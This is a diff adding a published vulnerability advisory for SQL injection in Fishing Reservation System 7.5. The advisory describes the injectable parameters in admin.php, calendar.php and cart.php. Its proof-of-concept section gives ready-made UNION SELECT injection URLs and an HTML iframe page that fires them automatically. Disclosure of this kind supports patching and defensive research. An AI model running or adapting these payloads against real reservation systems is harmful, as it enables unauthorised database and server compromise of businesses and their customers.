@@ -1,0 +1,143 @@
+# Title: Fishing Reservation System 7.5 - 'uid' SQL Injection
+# Author: Vulnerability Laboratory
+# Date: 2020-05-05
+# Vendor: https://fishingreservationsystem.com/index.html
+# Software: https://fishingreservationsystem.com/features.htm
+# CVE: N/A
+
+Document Title:
+===============
+Fishing Reservation System - Multiple Remote SQL Injection Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2243
+
+
+Common Vulnerability Scoring System:
+====================================
+7.5
+
+
+Product & Service Introduction:
+===============================
+(Copy of the Homepage: https://fishingreservationsystem.com/index.html
+&  https://fishingreservationsystem.com/features.htm )
+
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-04: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+Multiple remote sql-injection web vulnerabilities has been discovered in
+the official Fishing Reservation System application.
+The vulnerability allows remote attackers to inject or execute own sql
+commands to compromise the dbms or file system of the application.
+
+The remote sql injection web vulnerabilites are located in the pid, type
+and uid parameters of the admin.php control panel file. Guest accounts or
+low privileged user accounts are able to inject and execute own
+malicious sql commands as statement to compromise the local database and
+affected
+management system. The request method to inject/execute is GET and the
+attack vector is client-side. The vulnerability is a classic order by
+remote
+sql injection web vulnerability.
+
+Exploitation of the remote sql injection vulnerability requires no user
+interaction and a low privileged web-application user / guest account.
+Successful exploitation of the remote sql injection results in database
+management system, web-server and web-application compromise.
+
+Request Method(s):
+[+] GET
+
+Vulnerable File(s):
+[+] cart.php
+[+] calender.php
+[+] admin.php
+
+Vulnerable Parameter(s):
+[+] uid
+[+] pid
+[+] type
+[+] m
+[+] y
+[+] code
+
+
+Proof of Concept (PoC):
+=======================
+The remote sql-injection web vulnerability can be exploited by remote
+attackers with guest access or low privileged user account and without
+user interaction action.
+For security demonstration or to reproduce the remote sql injection web
+vulnerability follow the provided information and steps below to continue.
+
+
+PoC: Example
+https://frs.localhost:8080/system/admin.php?page=product/edit&type=s&pid='[SQL-INJECTION!]--
+https://frs.localhost:8080/system/admin.php?page=product/edit&type='[SQL-INJECTION!]--
+https://frs.localhost:8080/system/admin.php?page=user/edit&uid='[SQL-INJECTION!]--&PHPSESSID=
+-
+https://frs.localhost:8080/system/calendar.php?m='[SQL-INJECTION!]--&y=20&PHPSESSID=
+https://frs.localhost:8080/system/calendar.php?m=02&y='[SQL-INJECTION!]--&PHPSESSID=
+https://frs.localhost:8080/system/modules/cart.php?code='[SQL-INJECTION!]--&PHPSESSID=
+
+
+PoC: Exploitation (SQL-Injection)
+https://frs.localhost:8080/system/admin.php?page=product/edit&type=s&pid=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID=
+https://frs.localhost:8080/system/admin.php?page=product/edit&type=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&pid=2&PHPSESSID=
+https://frs.localhost:8080/system/admin.php?page=user/edit&uid=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID=
+-
+https://frs.localhost:8080/system/calendar.php?m=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&y=20&PHPSESSID=
+https://frs.localhost:8080/system/calendar.php?m=02&y=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID=
+https://frs.localhost:8080/system/modules/cart.php?code=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID=
+
+
+
+PoC: Exploit
+<html>
+<head><body>
+<title>Fishing Reservation System - SQL INJECTION EXPLOIT (PoC)</title>
+<iframe
+src="https://frs.localhost:8080/system/admin.php?page=product/edit&type=s&
+pid=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID="%20>
+<iframe src="https://frs.localhost:8080/system/admin.php?page=product/edit&
+type=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&pid=2&PHPSESSID="%20>
+<iframe src="https://frs.localhost:8080/system/admin.php?page=user/edit&
+uid=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID="%20>
+<br>-
+<iframe src="https://frs.localhost:8080/system/calendar.php?
+m=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&y=20&PHPSESSID="%20>
+<iframe src="https://frs.localhost:8080/system/calendar.php?m=02&
+y=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID="%20>
+<iframe src="https://frs.localhost:8080/system/modules/cart.php?
+code=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,@@version--&PHPSESSID="%20>
+</body></head>
+</html>
+
+
+Reference(s):
+https://frs.localhost:8080/
+https://frs.localhost:8080/system/
+https://frs.localhost:8080/system/modules/
+https://frs.localhost:8080/system/admin.php
+https://frs.localhost:8080/system/modules/cart.php
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
